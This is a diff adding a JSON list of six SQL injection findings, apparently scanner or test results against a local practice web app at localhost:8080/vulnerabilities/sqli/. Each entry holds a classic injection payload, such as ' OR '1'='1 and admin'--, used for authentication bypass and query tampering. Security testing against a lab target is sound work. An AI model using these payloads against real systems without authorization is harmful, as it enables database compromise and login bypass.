@@ -1,1 +1,32 @@
-[]
+[
+    {
+        "type": "SQL Injection",
+        "url": "http://localhost:8080/vulnerabilities/sqli/",
+        "payload": "'"
+    },
+    {
+        "type": "SQL Injection",
+        "url": "http://localhost:8080/vulnerabilities/sqli/",
+        "payload": "' OR '1'='1"
+    },
+    {
+        "type": "SQL Injection",
+        "url": "http://localhost:8080/vulnerabilities/sqli/",
+        "payload": "' OR 1=1--"
+    },
+    {
+        "type": "SQL Injection",
+        "url": "http://localhost:8080/vulnerabilities/sqli/",
+        "payload": "' OR 'a'='a"
+    },
+    {
+        "type": "SQL Injection",
+        "url": "http://localhost:8080/vulnerabilities/sqli/",
+        "payload": "' OR 1=1#"
+    },
+    {
+        "type": "SQL Injection",
+        "url": "http://localhost:8080/vulnerabilities/sqli/",
+        "payload": "admin'--"
+    }
+]
